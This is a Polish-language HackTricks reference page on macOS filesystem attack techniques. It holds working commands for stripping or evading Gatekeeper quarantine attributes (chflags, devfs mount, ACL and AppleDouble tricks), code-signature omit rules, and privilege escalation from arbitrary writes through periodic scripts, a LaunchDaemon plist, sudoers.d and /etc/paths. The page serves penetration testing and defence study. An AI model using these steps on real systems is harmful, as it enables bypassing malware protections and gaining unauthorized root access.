# Triki macOS FS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kombinacje uprawnień POSIX

Uprawnienia w **katalogu**:

* **odczyt** - możesz **wyliczyć** wpisy w katalogu
* **zapis** - możesz **usunąć/napisać** **pliki** w katalogu i możesz **usunąć puste foldery**.&#x20;
* Ale **nie możesz usunąć/modyfikować niepustych folderów**, chyba że masz do nich uprawnienia zapisu.
* **nie możesz zmienić nazwy folderu**, chyba że jesteś jego właścicielem.
* **wykonanie** - masz **prawo do przechodzenia** przez katalog - jeśli nie masz tego prawa, nie możesz uzyskać dostępu do żadnych plików wewnątrz niego ani w żadnych podkatalogach.

### Niebezpieczne kombinacje

**Jak nadpisać plik/folder należący do roota**, ale:

* Jeden z rodziców **katalogu właściciel** w ścieżce to użytkownik
* Jeden z rodziców **katalogu właściciel** w ścieżce to **grupa użytkowników** z **uprawnieniami do zapisu**
* Grupa użytkowników ma **uprawnienia do zapisu** do **pliku**

Z dowolną z powyższych kombinacji atakujący mógłby **wstrzyknąć** **link symboliczny/link twardy** do oczekiwanej ścieżki, aby uzyskać uprzywilejowane dowolne zapisywanie.

### Przypadek specjalny folderu root R+X

Jeśli w **katalogu** znajdują się pliki, do których **tylko root ma dostęp R+X**, to **nikt inny nie ma do nich dostępu**. Dlatego podatność, która pozwala na **przeniesienie pliku odczytywalnego przez użytkownika**, który nie może go odczytać z powodu tej **ograniczenia**, z tego folderu **do innego**, może być wykorzystana do odczytania tych plików.

Przykład: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Link symboliczny / Link twardy

Jeśli uprzywilejowany proces zapisuje dane w **pliku**, który może być **kontrolowany** przez **użytkownika o niższych uprawnieniach**, lub który może być **wcześniej utworzony** przez użytkownika o niższych uprawnieniach. Użytkownik może po prostu **skierować go do innego pliku** za pomocą linku symbolicznego lub twardego, a uprzywilejowany proces zapisze w tym pliku.

Sprawdź inne sekcje, w których atakujący może **wykorzystać dowolne zapisywanie do eskalacji uprawnień**.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać na inne aplikacje lub pliki binarne, więc po ich otwarciu zostanie uruchomiona aplikacja/plik binarny.\
Przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dowolny deskryptor pliku

Jeśli możesz sprawić, że **proces otworzy plik lub folder z wysokimi uprawnieniami**, możesz wykorzystać **`crontab`** do otwarcia pliku w `/etc/sudoers.d` z użyciem **`EDITOR=exploit.py`**, dzięki czemu `exploit.py` otrzyma deskryptor pliku wewnątrz `/etc/sudoers` i wykorzysta go.

Na przykład: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Triki unikania atrybutów xattrs kwarantanny

### Usuń to
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Flaga uchg / uchange / uimmutable

Jeśli plik/katalog ma tę atrybut niezmienności, nie będzie możliwe dodanie do niego xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montowanie defvfs

Montowanie **devfs** **nie obsługuje xattr**, więcej informacji w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Ta kontrola dostępu (ACL) zapobiega dodawaniu `xattrs` do pliku.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format pliku **AppleDouble** kopiuje plik wraz z jego ACE.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że reprezentacja tekstu ACL przechowywana w xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w rozpakowanym pliku. Jeśli więc spakujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, które uniemożliwia zapisywanie innych xattr, to atrybut kwarantanny nie zostanie ustawiony w aplikacji:

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) po więcej informacji.

Aby odtworzyć to, najpierw musimy uzyskać poprawny ciąg acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Zauważ, że nawet jeśli to działa, sandbox zapisuje atrybut quarantine przed tym)

Nie jest to naprawdę potrzebne, ale zostawiam to tutaj na wszelki wypadek:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Ominięcie podpisów kodu

Paczki zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego **pliku** w **paczce**. Należy zauważyć, że hash CodeResources jest również **osadzony w pliku wykonywalnym**, więc nie możemy go zmieniać.

Jednak istnieją pewne pliki, których podpis nie zostanie sprawdzony, mają one klucz omit w pliku plist, na przykład:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Możliwe jest obliczenie sygnatury zasobu za pomocą wiersza poleceń przy użyciu:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Montowanie plików DMG

Użytkownik może zamontować niestandardowy plik DMG nawet na istniejących folderach. Oto jak można utworzyć niestandardowy pakiet DMG z niestandardową zawartością:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Arbitrary Writes

### Skrypty sh okresowe

Jeśli twój skrypt może być interpretowany jako **skrypt powłoki**, możesz nadpisać skrypt powłoki **`/etc/periodic/daily/999.local`**, który będzie uruchamiany codziennie.

Możesz **udawać** wykonanie tego skryptu za pomocą polecenia: **`sudo periodic daily`**

### Daemony

Napisz dowolny **LaunchDaemon** o nazwie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** z plikiem plist, który wykonuje dowolny skrypt, na przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Wygeneruj skrypt `/Applications/Scripts/privesc.sh` zawierający **polecenia**, które chciałbyś uruchomić jako root.

### Plik Sudoers

Jeśli masz **arbitrary write**, możesz utworzyć plik w folderze **`/etc/sudoers.d/`**, który przyzna Ci uprawnienia **sudo**.

### Pliki PATH

Plik **`/etc/paths`** jest jednym z głównych miejsc, które uzupełniają zmienną środowiskową PATH. Musisz być rootem, aby go nadpisać, ale jeśli skrypt z **przywilejowanego procesu** wykonuje **polecenie bez pełnej ścieżki**, możesz go **przechwycić**, modyfikując ten plik.

Możesz również pisać pliki w **`/etc/paths.d`**, aby załadować nowe foldery do zmiennej środowiskowej `PATH`.

## Referencje

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
